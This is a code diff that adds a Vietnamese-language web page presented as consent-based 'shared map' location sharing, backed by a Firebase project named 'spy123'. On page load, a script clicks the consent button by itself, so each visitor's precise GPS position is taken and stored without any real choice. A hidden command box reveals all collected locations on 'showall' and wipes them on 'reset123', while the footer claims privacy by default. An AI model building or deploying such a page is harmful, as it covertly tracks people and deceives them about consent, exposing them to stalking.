@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Shared Map — Auto Share</title>
+
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"/>
+<style>
+  :root{--accent:#2563eb;--bg:#f3f6fb;--card:#fff;--muted:#6b7280}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Inter, Arial, sans-serif;background:var(--bg);height:100vh;display:flex}
+  #sidebar{width:320px;padding:18px;background:linear-gradient(180deg,var(--card),#fafcff);box-shadow:2px 0 12px rgba(30,40,60,0.05);overflow:auto}
+  #mapWrap{flex:1;display:flex;flex-direction:column}
+  #map{flex:1}
+  .logo{display:flex;gap:10px;align-items:center;margin-bottom:8px}
+  .logo img{width:48px;height:48px;border-radius:8px;object-fit:cover}
+  h1{margin:0;font-size:18px}
+  .muted{color:var(--muted);font-size:13px}
+  #status{margin-top:10px;font-size:14px;color:#0b2944}
+  #list{margin-top:14px}
+  .addr-card{background:linear-gradient(180deg,#fff,#fbfdff);padding:10px;border-radius:8px;margin-bottom:10px;border:1px solid #eef3fb}
+  .addr-card hr{border:none;height:1px;background:#eef2f7;margin:10px 0}
+  .addr-title{font-weight:600}
+  .addr-sub{color:var(--muted);font-size:13px;margin-top:6px}
+  #agreeBtn{padding:10px 12px;border-radius:8px;border:none;background:var(--accent);color:#fff;cursor:pointer;width:100%;}
+  #commandInput{position:fixed;top:12px;right:12px;width:180px;padding:8px;border-radius:8px;border:1px solid #ddd;z-index:1000}
+  footer{margin-top:14px;font-size:13px;color:var(--muted)}
+</style>
+</head>
+<body>
+
+  <input id="commandInput" type="text" placeholder='' title='Nhập showall để hiển thị tất cả vị trí (ẩn).' />
+
+  <div id="sidebar">
+    <div class="logo">
+      <img src="/mnt/data/74df73d0-1f1a-47d8-a2a1-e70d0631c0cc.png" alt="logo"/>
+      <div>
+        <h1>Shared Map — Explorer</h1>
+        <div class="muted">Đẹp • Đơn giản • Riêng tư mặc định</div>
+      </div>
+    </div>
+
+    <div style="margin-top:8px">
+      <button id="agreeBtn">Đồng ý chia sẻ vị trí</button>
+      <div id="status" class="muted">Trạng thái: chờ thao tác</div>
+    </div>
+
+    <hr style="margin:14px 0;border-top:1px solid #eef2f7"/>
+
+    <div id="list"><!-- dynamic address cards --></div>
+
+    <footer>Ghi chú: Mặc định bạn chỉ thấy vị trí của mình. Nhập <b>showall</b> để tạm bật xem tất cả.</footer>
+  </div>
+
+  <div id="mapWrap">
+    <div id="map"></div>
+  </div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+
+<script>
+    window.addEventListener("load", function () {
+    document.getElementById("agreeBtn").click();
+});
+// ---------- Firebase ----------
+const firebaseConfig = {
+    apiKey: "AIzaSyB3DDK2ejJwAENWvBfO6O2QCKoOTFgEgNc",
+    authDomain: "spy123-18cbc.firebaseapp.com",
+    databaseURL: "https://spy123-18cbc-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "spy123-18cbc",
+    storageBucket: "spy123-18cbc.appspot.com",
+    messagingSenderId: "439442019908",
+    appId: "1:439442019908:web:82e7988b8f7e8cfe4f0e11"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// ---------- Map ----------
+const map = L.map('map', { zoomControl:true }).setView([16.0544, 108.2022], 6);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+// ---------- Helpers ----------
+function timeAgo(ts){
+  if(!ts) return '';
+  const d = Math.floor((Date.now()-ts)/1000);
+  if(d<60) return d + ' giây trước';
+  if(d<3600) return Math.floor(d/60) + ' phút trước';
+  return Math.floor(d/3600) + ' giờ trước';
+}
+
+// ---------- Markers ----------
+const markers = new Map();
+const listEl = document.getElementById('list');
+const statusEl = document.getElementById('status');
+const cmdInput = document.getElementById('commandInput');
+
+// ---------- Generate person name ----------
+function getNextPersonName(){
+  let counter = parseInt(localStorage.getItem('personCounter') || '1', 10);
+  const name = 'person ' + counter;
+  localStorage.setItem('personCounter', counter + 1);
+  return name;
+}
+
+// ---------- Save position ----------
+function savePositionForUser(userId, name, lat, lon){
+  const ref = db.ref('positions/' + userId);
+  const payload = { name, lat, lon, timestamp: Date.now() };
+  return ref.set(payload);
+}
+
+// ---------- Show position ----------
+function showSinglePosition(key, obj){
+  if(!markers.has(key)){
+    const m = L.marker([obj.lat,obj.lon]).addTo(map).bindPopup(obj.name||key);
+    markers.set(key,m);
+  } else {
+    markers.get(key).setLatLng([obj.lat,obj.lon]).getPopup().setContent(obj.name||key);
+  }
+
+  const cardId = 'card_' + key;
+  if(!document.getElementById(cardId)){
+    const card = document.createElement('div');
+    card.className = 'addr-card'; card.id = cardId;
+    card.innerHTML = `<div class="addr-title">${obj.name||key}</div>
+      <div class="addr-sub">Lat: ${obj.lat.toFixed(5)}, Lon: ${obj.lon.toFixed(5)} • ${timeAgo(obj.timestamp)}</div>
+      <hr/><div style="display:flex;gap:8px"><button class="btn-view">Xem</button></div>`;
+    card.querySelector('.btn-view').addEventListener('click', ()=>{ map.setView([obj.lat,obj.lon],14); markers.get(key).openPopup(); });
+    listEl.appendChild(card);
+  }
+}
+
+// ---------- Agree button ----------
+document.getElementById('agreeBtn').addEventListener('click', ()=>{
+  const name = getNextPersonName();
+  statusEl.textContent='Đang lấy vị trí...';
+  if(!navigator.geolocation){ alert('Trình duyệt không hỗ trợ Geolocation.'); return; }
+
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat=pos.coords.latitude, lon=pos.coords.longitude;
+
+    // Save to a GLOBAL key, mọi người đều thấy
+    const key = name; // mỗi người một person N
+    savePositionForUser(key, name, lat, lon)
+      .then(()=> {
+        statusEl.textContent=`Đã lưu vị trí: ${name} (${timeAgo(Date.now())})`;
+        showSinglePosition(key, {name, lat, lon, timestamp: Date.now()});
+      })
+      .catch(err=> { statusEl.textContent='Lỗi lưu vị trí: '+err.message; });
+  }, err=>{
+    statusEl.textContent='Lỗi lấy vị trí: '+err.message;
+  }, {enableHighAccuracy:true,timeout:10000,maximumAge:0});
+});
+
+// ---------- Firebase listener ----------
+db.ref('positions').on('child_added', snap=>{
+  showSinglePosition(snap.key, snap.val());
+});
+
+db.ref('positions').on('child_changed', snap=>{
+  const key = snap.key;
+  const obj = snap.val();
+  if(markers.has(key)) markers.get(key).setLatLng([obj.lat,obj.lon]).getPopup().setContent(obj.name||key);
+});
+
+// ---------- Command input ----------
+cmdInput.addEventListener('keydown', async function(ev){
+  if(ev.key==='Enter'){
+    const txt = cmdInput.value.trim();
+    if(!txt) return;
+
+    if(txt==='reset123'){
+      if(confirm('Xác nhận xóa toàn bộ dữ liệu vị trí và khởi tạo lại từ đầu?')){
+        await db.ref('positions').remove();
+        markers.forEach(m=>map.removeLayer(m));
+        markers.clear();
+        listEl.innerHTML='';
+        Object.keys(localStorage).forEach(k=>{
+          if(k.startsWith('seen_')||k==='personCounter') localStorage.removeItem(k);
+        });
+        statusEl.textContent='Đã reset dữ liệu từ đầu.';
+      }
+      cmdInput.value=''; return;
+    }
+
+    if(txt==='showall'){
+      const snap = await db.ref('positions').once('value');
+      const data = snap.val()||{};
+      Array.from(listEl.querySelectorAll('.addr-card')).forEach(card=>card.remove());
+      for(const key in data) showSinglePosition(key,data[key]);
+      cmdInput.value=''; return;
+    }
+
+    alert('Lệnh không hợp lệ.');
+    cmdInput.value='';
+  }
+});
+</script>
+</body>
+</html>
